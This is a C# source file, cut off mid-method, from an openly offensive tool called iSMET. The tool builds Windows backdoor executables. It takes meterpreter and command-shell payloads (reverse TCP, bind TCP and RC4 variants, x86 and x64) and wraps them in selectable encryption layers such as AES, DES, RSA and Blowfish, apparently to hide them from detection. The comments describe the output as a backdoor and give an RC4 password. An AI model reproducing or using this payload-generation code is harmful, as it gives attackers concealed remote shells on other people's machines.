using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using iSMET.Encryption;
using iSMET.ShellCode;

namespace iSMET.CSharp.Collection
{
    //    ██╗███████╗███╗   ███╗███████╗████████╗    ██╗   ██╗██████╗    ██╗
    //    ██║██╔════╝████╗ ████║██╔════╝╚══██╔══╝    ██║   ██║╚════██╗  ███║
    //    ██║███████╗██╔████╔██║█████╗     ██║       ██║   ██║ █████╔╝  ╚██║
    //    ██║╚════██║██║╚██╔╝██║██╔══╝     ██║       ╚██╗ ██╔╝██╔═══╝    ██║
    //    ██║███████║██║ ╚═╝ ██║███████╗   ██║        ╚████╔╝ ███████╗██╗██║
    //    ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝   ╚═╝         ╚═══╝  ╚══════╝╚═╝╚═╝
    // iSMET - (A)Symmetric Meterpreter Encryption Tool v2.1
    // Author: @mindspoof - @PriviaSec
	public class CSharpLibrary
    {
        public class CreateApplications
        {
            private MeterpreterShellCode.x86ShellCode x86ShellCode = new MeterpreterShellCode.x86ShellCode();
            private MeterpreterShellCode.x64ShellCode x64ShellCode = new MeterpreterShellCode.x64ShellCode();
            private EncrypterMethod _encryptMethod = new EncrypterMethod();
            public string FileName = string.Empty;
			/// <summary>
			/// Get-Set Application Type
			/// Example 0: Console Application
			/// Example 1: Windows Form Application
			/// </summary>
            public int appType { get; set; }
			/// <summary>
			/// Get-Set Shell Type
			/// Example 0: Byte Array
			/// Example 1: Dword Array
			/// </summary>
            public int ShellType { get; set; }
			/// <summary>
			/// Get-Set Encryption Type
			/// Example 0: No Encryption
			/// Example 1: Base64
			/// Example 2: Rijndael
			/// Example 3: DES
			/// </summary>
            public int SelectedEncryption { get; set; }
			/// <summary>
			/// Select meterpreter/reverse_tcp payload method
			/// Set Method Parameter,
			/// Reverse IP Address : LHOST
			/// Reverse Port : LPORT
			/// Encryption Type: 0
			/// Backdoor Execution Timeout
			/// </summary>
			/// <param name="Ip"></param>
			/// <param name="Port"></param>
			/// <param name="encryption"></param>
			/// <param name="timeOut"></param>
			public void ReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ReverseTcp(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
                {
                    SelectedEncryption = (int) EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
                    SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
                    SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
                    SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
                    SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
                {
                    SelectedEncryption = (int) EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
                    SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
                    SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
                    SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
            /// <summary>
            /// Select meterpreter/reverse_tcp_rc4 payload method
            /// Set Method Parameter,
            /// Reverse IP Address : LHOST
            /// Reverse Port : LPORT
            /// Encryption Type: 0
            /// Backdoor Execution Timeout
            /// RC4 PASSWORD: iSMET
            /// </summary>
            /// <param name="Ip"></param>
            /// <param name="Port"></param>
            /// <param name="encryption"></param>
            /// <param name="timeOut"></param>
			public void ReverseTcpRc4(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ReverseTcpRc4(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
                    SelectedEncryption = (int)EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
                    SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
                    SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
                    SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
                    SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
                    SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
                    SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
                    SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
                    SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
            /// <summary>
            /// Select shell/reverse_tcp payload method
            /// Set Method Parameter,
            /// Reverse IP Address : LHOST
            /// Reverse Port : LPORT
            /// Encryption Type: 0
            /// Backdoor Execution Timeout
            /// </summary>
            /// <param name="Ip"></param>
            /// <param name="Port"></param>
            /// <param name="encryption"></param>
            /// <param name="timeOut"></param>
			public void ShellReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ShellReverseTcp(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
                    SelectedEncryption = (int)EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
                    SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
                    SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
                    SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
                    SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
                    SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
                    SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
                    SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
                    SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
            /// <summary>
            /// Select shell/reverse_tcp_rc4 payload method
            /// Set Method Parameter,
            /// Reverse IP Address : LHOST
            /// Reverse Port : LPORT
            /// Encryption Type: 0
            /// Backdoor Execution Timeout
            /// </summary>
            /// <param name="Ip"></param>
            /// <param name="Port"></param>
            /// <param name="encryption"></param>
            /// <param name="timeOut"></param>
			public void ShellReverseTcpRc4(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ShellReverseTcpRc4(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
                    SelectedEncryption = (int)EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
                    SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
                    SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
                    SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
                    SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
                    SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
                    SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
                    SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
                    SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
            /// <summary>
            /// Select x64/meterpreter/reverse_tcp payload method
            /// Set Method Parameter,
            /// Reverse IP Address : LHOST
            /// Reverse Port : LPORT
            /// Encryption Type: 0
            /// Backdoor Execution Timeout
            /// </summary>
            /// <param name="Ip"></param>
            /// <param name="Port"></param>
            /// <param name="encryption"></param>
            /// <param name="timeOut"></param>
			public void x64ReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ReverseTcp(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
                    SelectedEncryption = (int)EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
                    SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
                    SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
                    SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
                    SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
                    SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
                    SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
                    SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
                    SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
            /// <summary>
            /// Select x64/meterpreter/reverse_tcp_rc4 payload method
            /// Set Method Parameter,
            /// Reverse IP Address : LHOST
            /// Reverse Port : LPORT
            /// Encryption Type: 0
            /// Backdoor Execution Timeout
            /// RC4 PASSWORD: iSMET
            /// </summary>
            /// <param name="Ip"></param>
            /// <param name="Port"></param>
            /// <param name="encryption"></param>
            /// <param name="timeOut"></param>
			public void x64ReverseTcpRc4(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ReverseTcpRc4(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
                    SelectedEncryption = (int)EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
                    SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
                    SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
                    SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
                    SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
                    SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
                    SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
                    SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
            /// <summary>
            /// Select x64/shell/reverse_tcp payload method
            /// Set Method Parameter,
            /// Reverse IP Address : LHOST
            /// Reverse Port : LPORT
            /// Encryption Type: 0
            /// Backdoor Execution Timeout
            /// </summary>
            /// <param name="Ip"></param>
            /// <param name="Port"></param>
            /// <param name="encryption"></param>
            /// <param name="timeOut"></param>
			public void x64ShellReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ShellReverseTcp(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
                    SelectedEncryption = (int)EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
                    SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
                    SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
                    SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
                    SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
                    SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
                    SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
                    SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
                    SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
            /// <summary>
            /// Select meterpreter/bind_tcp payload method
            /// Set Method Parameter,
            /// Remote Port : RPORT
            /// Encryption Type: 0
            /// Backdoor Execution Timeout
            /// </summary>
            /// <param name="Port"></param>
            /// <param name="encryption"></param>
            /// <param name="timeOut"></param>
			public void BindTcp(string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.BindTcp(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
                    SelectedEncryption = (int)EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
                    SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
                    SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
                    SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
                    SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
                    SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
                    SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
                    SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
                    SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
            /// <summary>
            /// Select shell/bind_tcp payload method
            /// Set Method Parameter,
            /// Remote Port : RPORT
            /// Encryption Type: 0
            /// Backdoor Execution Timeout
            /// </summary>
            /// <param name="Port"></param>
            /// <param name="encryption"></param>
            /// <param name="timeOut"></param>
			public void ShellBindTcp(string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ShellBindTcp(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
                    SelectedEncryption = (int)EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
                    SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
                    SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
                    SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
                    SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
                    SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
                    SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
                    SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
                    SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
			/// <summary>
			/// Select shell/bind_tcp_rc4 payload method
			/// Set Method Parameter,
			/// Remote Port : RPORT
			/// Encryption Type: 0
			/// Backdoor Execution Timeout
			/// RC4 PASSWORD: iSMET
			/// </summary>
			/// <param name="Port"></param>
			/// <param name="encryption"></param>
			/// <param name="timeOut"></param>
			public void ShellBindTcpRc4(string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ShellBindTcpRc4(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
                    SelectedEncryption = (int)EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
                    SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
                    SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
                    SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
                    SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
                    SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
                    SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
                    SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
                    SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
            /// <summary>
            /// Select x64/meterpreter/bind_tcp payload method
            /// Set Method Parameter,
            /// Remote Port : RPORT
            /// Encryption Type: 0
            /// Backdoor Execution Timeout
            /// </summary>
            /// <param name="Port"></param>
            /// <param name="encryption"></param>
            /// <param name="timeOut"></param>
			public void x64BindTcp(string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.BindTcp(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
                    SelectedEncryption = (int)EncryptionType.NonEncryption;
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
                    SelectedEncryption = (int)EncryptionType.Base64;
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
                    SelectedEncryption = (int)EncryptionType.Rinjdael;
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
                    SelectedEncryption = (int)EncryptionType.DES;
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
                    SelectedEncryption = (int)EncryptionType.TripleDES;
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
                    SelectedEncryption = (int)EncryptionType.RcTwo;
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
                    SelectedEncryption = (int)EncryptionType.RSA;
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
                    SelectedEncryption = (int)EncryptionType.AESCBC;
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
                    SelectedEncryption = (int)EncryptionType.BlowFish;
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x64.ToString(), ShellType, appType, SelectedEncryption);
				}
			}
            /// <summary>
            /// Select x64/shell/bind_tcp payload method
            /// Set Method Parameter,
            /// Remote Port : RPORT
            /// Encryption Type: 0
            /// Backdoor Execution Timeout
            /// </summary>
            /// <param name="Port"></param>
            /// <param name="encryption"></param>
            /// <param name="timeOut"></param>
			public void x64ShellBindTcp(string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ShellBindTcp(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
                    SelectedEncryption = (int)EncryptionType.NonEncryption;
